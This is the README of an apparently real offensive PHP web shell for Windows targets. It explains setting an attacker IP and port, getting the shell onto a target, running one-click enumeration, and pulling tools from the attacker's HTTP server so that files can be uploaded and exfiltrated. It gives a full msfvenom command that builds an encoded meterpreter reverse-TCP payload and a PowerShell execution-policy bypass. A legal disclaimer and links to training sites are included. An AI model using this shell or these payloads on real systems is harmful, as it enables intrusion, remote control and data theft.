[![Actively Maintained](https://img.shields.io/badge/Maintenance%20Level-Actively%20Maintained-green.svg)](https://gist.github.com/cheerfulstoic/d107229326a01ff0f333a1d3476e068d)
# The Not-So Simple PHP Command Shell
![Logo](/img/nsscmdshell.png)
## Foreword:
> Please note that gaining access to the target is beyond the scope of this writing and your responsibility to establish in a manner consistent with established law.  This tool is intended to be used for on target enumeration to gather and exfiltrate information and then to upload and execute tools such as netcat or msvenom payload for further access to the target. The following websites provide training resources and practice scenarios and are excellent resources for learning such skills:

* https://www.hackthebox.eu/
* https://tryhackme.com/

Automates or simplifies many on target functions. Designed for windows targets. It isn't pretty, but it works as intended. I have included an assortment of common windows enumeration and escalation tools.  To generate your own msfvenom payload:

venom.exe : `sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=(ATTACKBOXIP) LPORT=(ATTACBOXPORT) -e x64/shikata_ga_nai -f exe -o venom.exe`

![Screen](https://github.com/kaotickj/The-Not-So-Simple-PHP-Command-Shell/blob/main/img/nsscmdshelluse.gif)

## Automates or simplifies many on target enumeration functions. Including:

* Simple system commands
* File upload/download options
* simple user manipulations (on compatible targets with sufficient privileges)
* One click user info/ user permissions info
* One click systeminfo
* One Click processes list
* One click file cleanup removes all files uploaded with this tool

## How to use it

First, change the variables, "$attackip" and "$attackport" to the appropriate values for YOUR attack machine:

`$attackip = "10.0.2.6";`

`$attackport = "8000";`

Now get "nsscmdshell.php" onto the target < - DISCLAIMER (in a manner consistent with applicable laws - and within scope of a written contract where required) - >.

Once the nsscmdshell is uploaded, typing valid commands into the command input or clicking the various cmd buttons will display the results in a windows command prompt style below the nsscmdshell interface.

![Screen](https://github.com/kaotickj/The-Not-So-Simple-PHP-Command-Shell/blob/main/img/nsscmdshell-output.png)

###### The upload and download options are self explanatory, but just to avoid any confusion:

If using the select field, choose your file and click "upload". Files linked in the select field options need to be present at the web root at the ip address and port in lines 10 and 11 of nsscmdshell.php.<sup>1</sup>

If using the open file dialog option, only files present at the ip address and port specified can be uploaded.

For the download option, simply enter the filename to be downloaded from the working directory of the target machine. Please note that files which can be managed by your browser will be opened in your browser - i.e., entering a text or html file to be downloaded will instead open the file in the web browser.

Example usage: run jaws-enum.ps1 - output to jaws.txt `powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename jaws.txt`, then download the output file to your attack machine for later close examination.

![Screen](https://github.com/kaotickj/The-Not-So-Simple-PHP-Command-Shell/blob/main/img/nsscmdshell-jaws.png)

The quick command buttons each have a title attribute with a brief description of the function - hover over the button to see the description.<br>

![Screen](https://github.com/kaotickj/The-Not-So-Simple-PHP-Command-Shell/blob/main/img/nsscmdshell-title-desc.png)

It goes without saying that the effectiveness of the various functions depends on the target os's support of the functions and the current user's permissions. This was designed for and tested on Windows XP - Windows 8.1 with very limited testing on Win10.

*** Got "Warning: file_get_contents(http://XX.XX.XX.XX:XXXX/filename.ext):failed to open stream: No connetion could be made...." error?
 Two possible causes:
1. You didn't set the variables, `$attackip` and `$attackport` to your machine. Fix: ifconfig your ip, and set in nsscmdshell.php lines 10 and 11.
2. The files are not available on the defined server or port, or there is no server running on the defined port. Fix: `python3 -m http.server XXXX` in a directory containing the files you're attempting to upload.

### Footnotes:
<sup>1</sup> I generally cd into my "windowstools" folder and start a simple http server:
`cd windowstools`
`python3 -m http.server 8000`.
![Screen](https://github.com/kaotickj/The-Not-So-Simple-PHP-Command-Shell/blob/main/img/nsscmdshell-listening.png)
![Hack The Box](http://www.hackthebox.eu/badge/image/476578)
